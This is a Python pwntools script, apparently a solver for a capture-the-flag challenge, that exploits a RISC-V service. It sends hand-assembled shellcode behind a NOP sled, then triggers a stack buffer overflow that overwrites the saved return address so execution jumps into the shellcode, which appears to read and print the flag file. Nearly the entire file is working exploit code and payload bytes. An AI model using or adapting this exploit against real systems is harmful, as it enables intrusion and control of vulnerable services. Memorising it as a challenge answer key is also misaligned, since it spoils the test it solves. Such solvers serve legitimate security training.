#!/usr/bin/env python3

from pwn import *
import sys
import logging
import os

context.log_level = 'debug'

def solve(r: remote):

    SYNC = b'ACEG'
    AA = b'\x41\x41'
    FACE = b'\xfa\xce'
    B1 = b'\x42\x42'

    # Exploitation requires two messages. 1) send the shellcode to a command with a large 
    # stack buffer and then 2) send another command that has a buffer overflow that allows
    # the saved RA address to be overwritten so control returns to shellcode in the first
    # buffer.
    # Note the shellcode buffer starts 396 bytes below the pointer printed at program start
    # but some of it will be mangled by other function calls hence the NOP sled at the top.
    # the shellcode address below lands further into the buffer to skip over any mangling
    # done by other function calls.
    SHELLCODE_ADDR = b'\x90\x0b\x80\x40'

    # \x13\x00\x00\x00 = NOP for RISC-V
    message1 = SYNC + FACE + \
                            b'\x13\x00\x00\x00' * 26 + \
                            b'\x01\x46' + \
                            b'\xb7\xb7\x04\x00' + \
                            b'\x93\x85\x07\x53' + \
                            b'\x13\x05\xc0\xf9' + \
                            b'\x93\x08\x80\x03' + \
                            b'\x73\x00\x00\x00' + \
                            b'\x93\x08\xf0\x03' + \
                            b'\x93\x05\x01\x00' + \
                            b'\x13\x06\x00\x08' + \
                            b'\x73\x00\x00\x00' + \
                            b'\x13\x05\x10\x00' + \
                            b'\x93\x08\x00\x04' + \
                            b'\x73\x00\x00\x00' + \
                            b'\x93\x08\xD0\x05' + \
                            b'\x73\x00\x00\x00' + \
                            b'B'*138

    r.send(message1)

    message3 = SYNC + B1 +  b'A'*36 + \
                            SHELLCODE_ADDR

    r.send(message3)

    flag = r.recvall()

    print(flag)

    logging.info("success :)")

if __name__ == "__main__":
    # get host from environment
    hostname = os.getenv("CHAL_HOST")
    if not hostname:
        print("No HOST supplied from environment")
        sys.exit(-1)

    # get port from environment
    port = int(os.getenv("CHAL_PORT","0"))
    if port == 0:
        print("No PORT supplied from environment")
        sys.exit(-1)

    
    # get ticket from environment
    ticket = os.getenv("TICKET")

    r = remote( hostname , port )
    
    if ticket is not None:
        # Do a ticket submission
        r.recvuntil(b"Ticket please:")
        r.sendline(bytes(ticket, 'utf-8'))
    
    r.recvuntil("Exploit me!")

    solve(r)
